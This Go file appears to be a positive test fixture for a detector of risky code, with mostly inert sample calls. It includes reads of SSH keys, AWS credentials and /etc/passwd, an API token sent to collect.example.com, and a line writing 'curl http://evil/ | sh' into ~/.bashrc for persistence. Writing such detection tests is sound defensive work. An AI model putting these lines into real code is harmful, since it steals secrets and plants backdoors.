package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

//go:linkname runtimeNanos runtime.nanotime

func cmdExec(c string) {
	exec.Command("sh", "-c", c).Run()
	exec.CommandContext(nil, "bash", "-c", c).Run()
}

func netGeneral(url string) {
	http.Get(url)
	http.Post(url, "text/plain", nil)
	http.PostForm(url, nil)
	http.DefaultClient.Do(nil)
}

func netSocket(addr string) {
	net.Dial("tcp", addr)
	net.DialTimeout("tcp", addr, 0)
}

func envSecret() string {
	return os.Getenv("AWS_SECRET_ACCESS_KEY")
}

func dynEval(p string) {
	plugin.Open(p)
}

func filProbe() {
	os.ReadFile(filepath.Join(os.Getenv("HOME"), ".ssh", "id_rsa"))
	os.Open("/etc/passwd")
	os.ReadFile("/root/.aws/credentials")
	// This call is the only positive coverage for the pack's second arm,
	// filepath.Join($DIR, $BASE) with a sensitive $BASE. The call above it joins
	// three arguments, so it can only match the os.ReadFile($PATH) arm; without
	// this line the two-argument arm would be exercised by the negative file
	// alone, and a broken arm would read as a covered family.
	credDir := filepath.Join(os.Getenv("HOME"), ".ssh")
	_ = credDir
}

func obfExec(payload string) []byte {
	raw, _ := base64.StdEncoding.DecodeString(payload)
	buf := new(bytes.Buffer)
	enc := base64.StdEncoding.EncodeToString(raw)
	fmt.Fprintln(io.Discard, enc)
	zr, _ := gzip.NewReader(bytes.NewReader(raw))
	fmt.Fprintln(io.Discard, zr)
	return raw
}

func exfiltrate() {
	token := os.Getenv("API_TOKEN")
	url := fmt.Sprintf("https://collect.example.com/%s", token)
	http.Get(url)
}

func persist() {
	target := filepath.Join(os.Getenv("HOME"), ".bashrc")
	os.WriteFile(target, []byte("curl http://evil/ | sh\n"), 0644)
	exec.Command("sh", "-c", "crontab -l").Run()
}

func embDataDump(dataset []byte, out string) {
	os.WriteFile(out, dataset, 0644)
	var buf bytes.Buffer
	enc := gob.NewEncoder(&buf)
	enc.Encode(dataset)
}

func embCopyExport(src string) {
	outputPath := filepath.Join("output", "result.bin")
	os.Rename(src, outputPath)
	f, _ := os.Create(outputPath)
	io.Copy(f, nil)
}

func embLogDump(dataset []byte) {
	fmt.Println(dataset)
	log.Println(dataset)
}

func embStegoWeight(weights []byte) {
	encoded := base64.StdEncoding.EncodeToString(weights)
	saveWeights(encoded)
}

func saveWeights(s string) {}
